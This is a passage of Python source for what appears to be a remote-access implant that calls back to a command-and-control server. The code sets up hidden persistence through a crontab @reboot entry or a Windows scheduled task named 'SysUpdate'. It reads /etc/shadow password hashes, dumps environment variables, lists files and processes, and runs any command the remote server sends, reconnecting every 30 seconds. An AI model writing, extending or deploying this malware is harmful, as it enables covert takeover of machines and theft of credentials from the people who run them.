            except: existing = ""
            if script not in existing:
                new = existing.rstrip() + "\n@reboot " + exe + " " + script + " &\n"
                proc = subprocess.Popen(["crontab", "-"], stdin=subprocess.PIPE, text=True)
                proc.communicate(input=new)
                return "Persistence via crontab"
            return "Already persistent"
        elif platform.system() == "Windows":
            cmd = 'schtasks /create /tn "SysUpdate" /tr "' + exe + " " + script + '" /sc onlogon /f'
            return subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
        return "Unsupported OS"

    def cmd_ls(self, args):
        path = args.strip() or "."
        try:
            entries = os.listdir(path)
            lines = []
            for e in sorted(entries):
                fp = os.path.join(path, e)
                try:
                    s = os.stat(fp)
                    t = "d" if os.path.isdir(fp) else "-"
                    lines.append(t + " " + str(s.st_size).rjust(10) + "  " + e)
                except: lines.append("? " + e)
            return "\n".join(lines) or "(empty)"
        except Exception as e: return str(e)

    def cmd_cat(self, args):
        try:
            with open(args.strip(), "r", errors="replace") as f: return f.read(102400)
        except Exception as e: return str(e)

    def cmd_ps(self, args):
        if platform.system() == "Windows": return self.cmd_exec("tasklist")
        return self.cmd_exec("ps aux")

    def cmd_env(self, args):
        return "\n".join(k + "=" + v for k, v in sorted(os.environ.items()))

    def cmd_netstat(self, args):
        if platform.system() == "Windows": return self.cmd_exec("netstat -ano")
        return self.cmd_exec("ss -tlnp 2>/dev/null || netstat -tlnp")

    def cmd_hashdump(self, args):
        if platform.system() == "Linux":
            try:
                with open("/etc/shadow", "r") as f: return f.read()
            except: return "Need root for /etc/shadow"
        return "OS-specific hashdump required"

    def cmd_exit(self, args):
        self.running = False
        return "Bye"

    def dispatch(self, raw):
        cmd_str = raw.decode("utf-8", errors="replace").strip()
        parts = cmd_str.split(" ", 1)
        cmd, args = parts[0].lower(), parts[1] if len(parts) > 1 else ""
        handler = self.modules.get(cmd)
        if handler:
            result = handler(args)
            return result.encode() if isinstance(result, str) else result
        return self.cmd_exec(cmd_str).encode()

    def run(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(60)
                self.sock.connect((self.c2_host, self.c2_port))
                self._send(self.cmd_sysinfo(""))
                while self.running:
                    data = self._recv()
                    if data is None: break
                    self._send(self.dispatch(data))
            except: pass
            finally:
                try: self.sock.close()
                except: pass
            if self.running: time.sleep(30)

def demo():
